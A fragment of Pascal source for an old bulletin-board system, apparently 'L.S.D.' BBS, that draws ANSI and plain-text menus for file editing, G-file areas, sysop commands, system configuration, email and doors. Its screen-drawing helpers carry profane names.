	 fuckxy(8,21,' '+^I+'[E]'+^D+' Rename File ');
	 fuckxy(9,21,' '+^I+'[D]'+^D+' Delete File ');
	 fuckxy(8,43,' '+^I+'[R]'+^D+' Zip List        ');
	 fuckxy(9,43,' '+^I+'[M]'+^D+' Move File       ');
	 fuckxy(10,43,' '+^I+'[#]'+^D+' Points For File ');
	 printxy(21,0,'');
	 end;

procedure fchange;
  begin
   clearscr;
    fuckup(1,31,20,3);
		fuckxy(2,32,^D+' File Change Menu '+^R);
		fuckup(8,46,22,7);
		fuckup(5,18,25,8);
		fuckxy(6,19,^D+' '+^I+'[Q]'+^D+' Quit              ');
		fuckxy(7,19,' '+^I+'[U]'+^D+' Change Uploader   ');
		fuckxy(8,19,' '+^I+'[D]'+^D+' Description       ');
		fuckxy(9,19,' '+^I+'[S]'+^D+' Special Request   ');
		fuckxy(10,19,' '+^I+'[N]'+^D+' New File          ');
	 fuckxy(11,19,' '+^I+'[F]'+^D+' Change File Name  ');
		fuckxy(9,47,' '+^I+'[P]'+^D+' Change Path    ');
		fuckxy(10,47,' '+^I+'[V]'+^D+' Change Points  ');
		fuckxy(11,47,' '+^I+'[B]'+^D+' Take Offline   ');
	 fuckxy(12,47,' '+^I+'[T]'+^D+' Change For Who ');
	 fuckxy(13,47,' '+^I+'[A]'+^D+' Change P.Word  ');
	 printxy(21,0,'');
	 end;

procedure Gfile;
begin
clearscr;
if AnsiGraphics in Urec.Config then Begin
fuckup(1,31,19,3);
fuckxy(2,32,^D+'   G-File Menu   '+^R);
fuckup(5,25,20,11);
fuckxy(6,26,^D+' '+^I+'[A]'+^D+' Change Area  ');
fuckxy(7,26,' '+^I+'[F]'+^D+' List Files   ');
fuckxy(8,26,' '+^I+'[G]'+^D+' Log Off LSD  ');
fuckxy(9,26,' '+^I+'[D]'+^D+' Download     ');
fuckxy(10,26,' '+^I+'[N]'+^D+' Newscan All  ');
fuckxy(11,26,' '+^I+'[V]'+^D+' Newscan Here ');
fuckxy(12,26,' '+^I+'[Y]'+^D+' Your Status  ');
fuckxy(13,26,' '+^I+'[U]'+^D+' Upload GFile ');
fuckxy(14,26,' '+^I+'[Q]'+^D+' Quit G-Files ');
printxy(21,0,'');
End Else
  WriteLn(^M^M'                      - L.S.D. G-File Menu -'^M^M,
              'A - Change G-File Area   F - List Files    G - Log Off BBS'^M,
              'D - Download a file      N - Newscan All   V - Newscan This Area'^M,
              'Y - Your Status          U - Upload Gfile  Q - Quit G-File Area'^M^M);
end;

procedure sgfile;
begin
clearscr;
fuckup(1,3,73,6);
fuckxy(2,4,^D+'                     - G-File SysOp Commands -                         ');
fuckxy(3,4,' '+^I+'[A]'+^D+' Add G-File   '+^I+'[C]'+^D+' Edit G-File  '+^I+'[D]'
+^D+' Delete G-File  '+^I+'[K]'+^D+' Kill Area    ');
fuckxy(4,4,' '+^I+'[R]'+^D+' Modify Area  '+^I+'[M]'+^D+' Move G-File  '+^I+'[S]'+^D
+' Sort Area      '+^I+'[O]'+^D+' Reorder Area ');
fuckxy(5,4,' '+^I+'[W]'+^D+' Add files    '+^I+'[F]'+^D+' Directory    '+^I+'[Q]'+^D
+' Quit Sponsor Commands           ');
printxy(21,0,'');
end;


procedure configl;
begin
clearscr;
fuckup(1,1,80,8);
fuckxy(2,2,^D+'                        - System Configuration Menu -                         ');
fuckxy(3,2,'  '+^I+'[S]'+^D+' Change BBS Shortname    '+^I+'[M]'+^D+' Change Matrix Type   '+^I+'[P]'
+^D+' System Password    ');
fuckxy(4,2,'  '+^I+'[N]'+^D+' New User Password       '+^I+'[U]'+^D+' Upload Time Back     '+^I+'[T]'
+^D+' Sysop Password     ');
fuckxy(5,2,'  '+^I+'[A]'+^D+' Allow New Users off/on  '+^I+'[H]'+^D+' Login "Cliche"       '+^I+'[F]'
+^D+' Matrix Feedback    ');
fuckxy(6,2,'  '+^I+'[C]'+^D+' Matrix Chat             '+^I+'[Q]'+^D+' Quit this Section    '+^I+'[V]'
+^D+' View Configuration ');
fuckxy(7,2,'  '+^I+'[L]'+^D+' Turn On/Off "Leech Week"                                                ');
printxy(21,0,'');
end;

procedure escan;
begin
clearscr;
writeln('                 - E-Mail Scan Menu-');
writeln(^M'Q - Quit reading email   S - Send Mail  E- Edit sender  R - Edit receiver');
writeln(  'D - Delete Mail          A - Reread Mail                C - Change Mail');
printxy(21,0,'');
end;


Procedure SDoors;
Begin
ClearScr;
WriteLn('                 - SysOp Doors Menu -');
WriteLn(^M'Q - Quit Doors Menu  C - Change Doors Info  A - Add Doors  D - Delete Door');
PrintXy(21,0,'');
End;

begin
end.